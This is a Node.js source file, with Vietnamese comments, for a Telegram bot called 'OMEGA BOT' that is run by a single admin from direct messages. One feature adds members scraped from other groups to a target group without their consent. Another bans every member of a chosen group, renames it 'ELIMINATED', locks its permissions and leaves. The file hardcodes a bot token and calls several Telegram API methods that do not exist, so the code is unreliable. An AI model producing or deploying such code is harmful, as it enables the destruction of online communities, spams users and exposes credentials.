// ============================================================
// OMEGA BOT v666 — FULL CODE FIX LỖI BAN ALL / KÉO MEM
// ĐIỀU KHIỂN TỪ DM — PHÂN BIỆT RÕ RÀNG BAN VÀ KÉO
// ============================================================

const express = require('express');
const { Telegraf, session, Markup } = require('telegraf');

// ==================== CONFIG ====================
const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
const ADMIN_ID = 7757046138;

// ==================== PROTECTED ====================
const PROTECTED_USERNAMES = ['ongvuaphantich'];
const PROTECTED_IDS = [];

function isProtected(chat) {
  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) return true;
  if (PROTECTED_IDS.includes(chat.id)) return true;
  return false;
}

// ==================== ENGINE ====================
const app = express();
const bot = new Telegraf(BOT_TOKEN);

// 🔥 SESSION FIX
bot.use(session({
  defaultSession: () => ({
    lastAction: null,
    targetGroup: null,
    waitingForLink: false
  })
}));

let pullActive = false;
let pulledCount = 0;
let isKilling = false;
let targetGroupId = null;
let targetGroupLink = null;

// ==================== MENU ADMIN ====================
function getAdminMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('🚀 KÉO MEM', 'pull_menu')],
    [Markup.button.callback('📋 DANH SÁCH GROUP', 'list_groups')],
    [Markup.button.callback('🔨 BAN ALL', 'ban_menu')],
    [Markup.button.callback('📊 THỐNG KÊ', 'status')],
    [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')]
  ]);
}

// ==================== MENU USER ====================
function getUserMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📊 THỐNG KÊ', 'status')]
  ]);
}

// ==================== KIỂM TRA BOT TRONG GROUP ====================
async function checkBotInGroup(chatId) {
  try {
    const chat = await bot.telegram.getChat(chatId);
    const botMember = await bot.telegram.getChatMember(chatId, (await bot.telegram.getMe()).id);
    return { 
      inGroup: true, 
      isAdmin: botMember.status === 'administrator' || botMember.status === 'creator', 
      chat: chat 
    };
  } catch (e) {
    return { inGroup: false, isAdmin: false, chat: null };
  }
}

// ==================== LẤY LINK GROUP ====================
async function getGroupLink(chatId) {
  try {
    const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
    return inviteLink;
  } catch (e) {
    return null;
  }
}

// ==================== LẤY DANH SÁCH GROUP ====================
async function getBotGroups() {
  try {
    const dialogs = await bot.telegram.getChats();
    const groups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      !isProtected(d)
    );
    
    const result = [];
    for (const g of groups) {
      const check = await checkBotInGroup(g.id);
      if (check.inGroup && check.isAdmin) {
        const link = await getGroupLink(g.id);
        result.push({
          id: g.id,
          title: g.title || 'Không tên',
          link: link || 'Không có link',
          memberCount: await bot.telegram.getChatMembersCount(g.id)
        });
      }
    }
    return result;
  } catch (e) {
    return [];
  }
}

// ==================== AUTO PULL ====================
async function autoPull() {
  if (!pullActive || !targetGroupId) return;
  
  try {
    const target = await bot.telegram.getChat(targetGroupId);
    const groups = await getBotGroups();
    
    for (const group of groups) {
      if (!pullActive) break;
      if (group.id === target.id) continue;
      
      try {
        if (group.memberCount < 30) continue;

        const admins = await bot.telegram.getChatAdministrators(group.id);
        const adminIds = admins.map(a => a.user.id);
        
        const participants = await bot.telegram.getChatMembers(group.id, { limit: 15 });
        
        for (const member of participants) {
          if (!pullActive) break;
          if (member.user.id === ADMIN_ID) continue;
          if (member.user.is_bot) continue;
          if (adminIds.includes(member.user.id)) continue;

          try {
            await bot.telegram.inviteToChat(target.id, member.user.id);
            pulledCount++;
            console.log(`✅ Kéo thành công: ${member.user.first_name} (${pulledCount})`);
            await new Promise(r => setTimeout(r, 1500));
          } catch (e) {
            console.log(`⚠️ Lỗi kéo: ${e.message}`);
          }
        }
      } catch (e) {
        console.log(`⚠️ Lỗi group: ${e.message}`);
      }
    }
  } catch (e) {
    console.log(`⚠️ Lỗi pull cycle: ${e.message}`);
  }
}

// ==================== BAN ALL ====================
async function banAllMembers(chatId, ctx) {
  let banned = 0;
  let failed = 0;
  let total = 0;

  try {
    const botCheck = await checkBotInGroup(chatId);
    if (!botCheck.inGroup) {
      throw new Error('❌ Bot chưa được thêm vào group này!');
    }
    if (!botCheck.isAdmin) {
      throw new Error('❌ Bot chưa được làm admin trong group này!');
    }

    const link = await getGroupLink(chatId);
    if (!link) {
      throw new Error('❌ Không thể lấy link group!');
    }

    const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
    total = participants.length;
    
    for (const member of participants) {
      if (member.user.id === ADMIN_ID) continue;
      if (member.user.id === ctx.botInfo.id) continue;
      if (member.user.is_bot) continue;

      try {
        await ctx.telegram.banChatMember(chatId, member.user.id);
        banned++;
        await new Promise(r => setTimeout(r, 100));
      } catch (e) {
        failed++;
      }
    }
    
    try {
      await ctx.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
      await ctx.telegram.setChatPermissions(chatId, {
        can_send_messages: false,
        can_send_media: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      await ctx.telegram.leaveChat(chatId);
    } catch {}

    return { banned, failed, total, link, success: true };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ==================== WELCOME ====================
bot.start(async (ctx) => {
  if (ctx.chat.type !== 'private') {
    return ctx.reply('⚠️ Vui lòng dùng bot trong chat riêng (DM)!');
  }
  
  if (!ctx.session) {
    ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
  }
  
  const user = ctx.from;
  const isAdmin = user.id === ADMIN_ID;

  const welcomeMessage = `
🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**

━━━━━━━━━━━━━━━━━━━━━
👋 **Xin chào, ${user.first_name || 'đồng chí'}!**

🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
⚡ **Điều khiển từ DM — gửi link group**
${isAdmin ? '🔨 **BAN ALL giết sạch group chỉ trong vài giây**' : '🔒 **Bạn là thành viên thường — chỉ xem thống kê**'}
🛡️ **Group @ongvuaphantich đã được bảo vệ**

━━━━━━━━━━━━━━━━━━━━━
📌 **Hướng dẫn:**

${isAdmin ? `
• Bấm **"🚀 KÉO MEM"** → gửi link group target
• Bấm **"🔨 BAN ALL"** → gửi link group cần giết
• Bấm **"📋 DANH SÁCH GROUP"** → xem tất cả group
• Bấm **"📊 THỐNG KÊ"** → xem số liệu
• Bấm **"🛑 DỪNG KÉO"** → tạm dừng kéo mem
` : `
• Bấm **"📊 THỐNG KÊ"** → xem số liệu
`}
━━━━━━━━━━━━━━━━━━━━━
🔥 **Chúc bạn chinh phục mọi group!**
`;

  await ctx.replyWithHTML(welcomeMessage, isAdmin ? getAdminMenu() : getUserMenu());
});

// ==================== HANDLE PULL MENU ====================
bot.action('pull_menu', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  
  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
  
  // 🔥 SET ACTION = PULL
  ctx.session.lastAction = 'pull';
  ctx.session.waitingForLink = true;
  
  await ctx.answerCbQuery('📋 Vui lòng gửi link group!');
  await ctx.reply(
    `📋 **KÉO MEM - HƯỚNG DẪN**\n\n` +
    `1️⃣ Gửi link group target\n` +
    `2️⃣ Bot kiểm tra quyền ADMIN\n` +
    `3️⃣ Nếu đủ → tự động kéo mem từ nhóm lớn\n\n` +
    `📌 **Ví dụ:** https://t.me/your_group\n\n` +
    `⚠️ **Yêu cầu:** Bot phải được làm ADMIN!`,
    Markup.inlineKeyboard([
      [Markup.button.callback('🔙 QUAY LẠI', 'back_main')]
    ])
  );
});

// ==================== HANDLE BAN MENU ====================
bot.action('ban_menu', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
  
  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
  
  // 🔥 SET ACTION = BAN
  ctx.session.lastAction = 'ban';
  ctx.session.waitingForLink = true;
  
  await ctx.answerCbQuery('📋 Vui lòng gửi link group!');
  await ctx.reply(
    `🔨 **BAN ALL - HƯỚNG DẪN**\n\n` +
    `1️⃣ Gửi link group cần giết\n` +
    `2️⃣ Bot kiểm tra quyền ADMIN\n` +
    `3️⃣ Nếu đủ → ban ALL thành viên (trừ admin)\n\n` +
    `📌 **Ví dụ:** https://t.me/your_group\n\n` +
    `⚠️ **Yêu cầu:** Bot phải được làm ADMIN!`,
    Markup.inlineKeyboard([
      [Markup.button.callback('🔙 QUAY LẠI', 'back_main')]
    ])
  );
});

// ==================== HANDLE TEXT ====================
bot.on('text', async (ctx) => {
  if (ctx.chat.type !== 'private') return;
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.reply('❌ Bạn không có quyền sử dụng bot này!');
  }
  
  if (!ctx.session) {
    ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
  }
  
  const text = ctx.message.text;
  
  // 🔥 NẾU KHÔNG PHẢI LINK VÀ ĐANG CHỜ LINK
  if (!text.includes('t.me/') && !text.includes('joinchat')) {
    if (ctx.session.waitingForLink) {
      return ctx.reply('❌ Vui lòng gửi link group hợp lệ! (VD: https://t.me/your_group)');
    }
    return;
  }
  
  // ==================== XỬ LÝ LINK ====================
  if (text.includes('t.me/') || text.includes('joinchat')) {
    await ctx.reply('🔄 Đang xử lý link group...');
    
    try {
      let chatId = null;
      let chatTitle = 'Unknown';
      
      // Xử lý link t.me/username
      if (text.includes('t.me/') && !text.includes('joinchat')) {
        const username = text.split('t.me/')[1].split('/')[0].split('?')[0];
        const chat = await bot.telegram.getChat(`@${username}`);
        chatId = chat.id;
        chatTitle = chat.title || username;
      } 
      // Xử lý link joinchat
      else if (text.includes('joinchat')) {
        try {
          const invite = await bot.telegram.importChatInviteLink(text);
          chatId = invite.id;
          chatTitle = invite.title || 'Group';
        } catch (e2) {
          return ctx.reply(`❌ Không thể xử lý link: ${e2.message}`);
        }
      }
      
      if (!chatId) {
        return ctx.reply('❌ Không thể lấy ID group từ link! Vui lòng kiểm tra lại link.');
      }
      
      // Kiểm tra bot có trong group không
      const check = await checkBotInGroup(chatId);
      
      if (!check.inGroup) {
        ctx.session.waitingForLink = false;
        return ctx.reply(
          `❌ **BOT CHƯA ĐƯỢC THÊM VÀO GROUP**\n\n` +
          `📌 **Group:** ${chatTitle}\n` +
          `🔗 **Link:** ${text}\n\n` +
          `📋 **Hướng dẫn:**\n` +
          `1️⃣ Thêm bot @${(await bot.telegram.getMe()).username} vào group\n` +
          `2️⃣ Làm bot thành ADMIN\n` +
          `3️⃣ Gửi lại link group`
        );
      }
      
      if (!check.isAdmin) {
        ctx.session.waitingForLink = false;
        return ctx.reply(
          `❌ **BOT CHƯA ĐƯỢC LÀM ADMIN**\n\n` +
          `📌 **Group:** ${chatTitle}\n` +
          `🔗 **Link:** ${text}\n\n` +
          `📋 **Hướng dẫn:**\n` +
          `1️⃣ Vào group → Quản lý nhóm\n` +
          `2️⃣ Thêm bot @${(await bot.telegram.getMe()).username} làm ADMIN\n` +
          `3️⃣ Gửi lại link group`
        );
      }
      
      // 🔥 LẤY ACTION TỪ SESSION
      const action = ctx.session.lastAction || 'pull';
      console.log(`📋 Action: ${action} | Group: ${chatTitle}`);
      
      // ==================== BAN ALL ====================
      if (action === 'ban') {
        await ctx.reply(
          `🔨 **BAN ALL - ĐANG GIẾT**\n\n` +
          `📌 **Group:** ${chatTitle}\n` +
          `🔗 **Link:** ${text}\n` +
          `👥 **Thành viên:** ${await bot.telegram.getChatMembersCount(chatId)}\n\n` +
          `☠️ Đang giết tất cả thành viên...`
        );
        
        const result = await banAllMembers(chatId, ctx);
        
        if (result.success) {
          await ctx.reply(
            `✅ **GIẾT GROUP HOÀN TẤT**\n` +
            `━━━━━━━━━━━━━━━━━━━━━\n` +
            `📌 **Group:** ${chatTitle}\n` +
            `🔗 **Link:** ${result.link}\n` +
            `💀 Đã ban: ${result.banned} người\n` +
            `❌ Lỗi: ${result.failed}\n` +
            `👥 Tổng: ${result.total}\n\n` +
            `☠️ Không ai sống sót.`
          );
        } else {
          await ctx.reply(`❌ **BAN ALL THẤT BẠI**\n\n${result.error}`);
        }
        
        // 🔥 RESET SESSION
        ctx.session.lastAction = null;
        ctx.session.waitingForLink = false;
        await ctx.reply('📋 Quay lại menu chính.', getAdminMenu());
      }
      
      // ==================== KÉO MEM ====================
      else if (action === 'pull') {
        targetGroupId = chatId;
        targetGroupLink = text;
        
        await ctx.reply(
          `🚀 **KÉO MEM - BẮT ĐẦU**\n\n` +
          `📌 **Group target:** ${chatTitle}\n` +
          `🔗 **Link:** ${text}\n` +
          `👥 **Thành viên:** ${await bot.telegram.getChatMembersCount(chatId)}\n\n` +
          `📊 Đã kéo: ${pulledCount} người\n\n` +
          `🔄 Đang chạy...`
        );
        
        // 🔥 RESET SESSION
        ctx.session.lastAction = null;
        ctx.session.waitingForLink = false;
        
        pullActive = true;
        
        // Chạy vòng lặp kéo mem
        while (pullActive) {
          await autoPull();
          await new Promise(r => setTimeout(r, 25000));
        }
      }
      
    } catch (e) {
      ctx.session.waitingForLink = false;
      await ctx.reply(`❌ **LỖI XỬ LÝ LINK**\n\n${e.message}`);
    }
  }
});

// ==================== HANDLE PULL OFF ====================
bot.action('pull_off', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (!pullActive) return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
  
  pullActive = false;
  await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
  await ctx.reply(
    `⏸️ **DỪNG KÉO**\n\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${targetGroupLink || 'Không có'}`,
    getAdminMenu()
  );
});

// ==================== DANH SÁCH GROUP ====================
bot.action('list_groups', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
  
  await ctx.answerCbQuery('📋 Đang lấy danh sách...');
  
  const groups = await getBotGroups();
  
  if (groups.length === 0) {
    return ctx.reply(
      '❌ **KHÔNG TÌM THẤY GROUP NÀO**\n\n' +
      'Bot chưa được thêm hoặc làm admin trong bất kỳ group nào.',
      getAdminMenu()
    );
  }
  
  let msg = '📋 **DANH SÁCH GROUP**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
  for (let i = 0; i < groups.length; i++) {
    const g = groups[i];
    msg += `${i+1}. **${g.title}**\n`;
    msg += `   👥 ${g.memberCount} thành viên\n`;
    msg += `   🔗 ${g.link}\n\n`;
  }
  msg += `📌 **Tổng cộng:** ${groups.length} groups`;
  
  await ctx.reply(msg, getAdminMenu());
});

// ==================== STATUS ====================
bot.action('status', async (ctx) => {
  try {
    const me = await ctx.telegram.getMe();
    const groups = await getBotGroups();
    const isAdmin = ctx.from.id === ADMIN_ID;
    
    await ctx.answerCbQuery('📊 Thống kê đây!');
    await ctx.reply(
      `📊 **OMEGA BOT STATUS**\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `🤖 Bot: ${me.first_name}\n` +
      `🆔 ID: ${me.id}\n` +
      `👥 Số group: ${groups.length}\n` +
      `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
      `📊 Đã kéo: ${pulledCount} người\n` +
      `🎯 Target: ${targetGroupLink || 'Chưa có'}\n` +
      `🛡️ Bảo vệ: @ongvuaphantich\n` +
      `👑 Admin: ${ADMIN_ID}\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `*"Mày command. Tao execute."*`,
      isAdmin ? getAdminMenu() : getUserMenu()
    );
  } catch (e) {
    await ctx.reply(`❌ Lỗi: ${e.message}`);
  }
});

// ==================== BACK MAIN ====================
bot.action('back_main', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  
  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
  
  // 🔥 RESET SESSION KHI QUAY LẠI
  ctx.session.lastAction = null;
  ctx.session.waitingForLink = false;
  
  await ctx.answerCbQuery('🔙 Quay lại menu');
  await ctx.reply('📋 **QUAY LẠI MENU CHÍNH**', getAdminMenu());
});

// ==================== WEB SERVER ====================
app.use(express.json());

app.get('/', (req, res) => {
  res.send(`
    <h1>🐱 OMEGA BOT</h1>
    <p>🔥 Điều khiển từ DM — Qua link group</p>
    <p>👑 Admin: ${ADMIN_ID}</p>
    <p>📊 Đã kéo: ${pulledCount} người</p>
    <p>⚡ Trạng thái: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}</p>
    <p>🛡️ Bảo vệ: @ongvuaphantich</p>
    <hr>
    <p><i>Supreme Bot for Butter — 2026</i></p>
  `);
});

// ==================== LAUNCH ====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`✅ Web server chạy trên port ${PORT}`);
  console.log(`🐱 OMEGA BOT ONLINE`);
  console.log(`👑 Admin: ${ADMIN_ID}`);
});

bot.launch({
  dropPendingUpdates: true
})
.then(() => {
  console.log('✅ OMEGA BOT đã khởi động thành công!');
})
.catch((err) => {
  console.error('❌ Lỗi khởi động bot:', err);
  process.exit(1);
});

setInterval(() => {
  console.log('💓 OMEGA BOT vẫn đang sống...');
}, 30000);

process.once('SIGINT', () => {
  console.log('🛑 Đang tắt bot...');
  bot.stop('SIGINT');
  process.exit(0);
});

process.once('SIGTERM', () => {
  console.log('🛑 Đang tắt bot...');
  bot.stop('SIGTERM');
  process.exit(0);
});
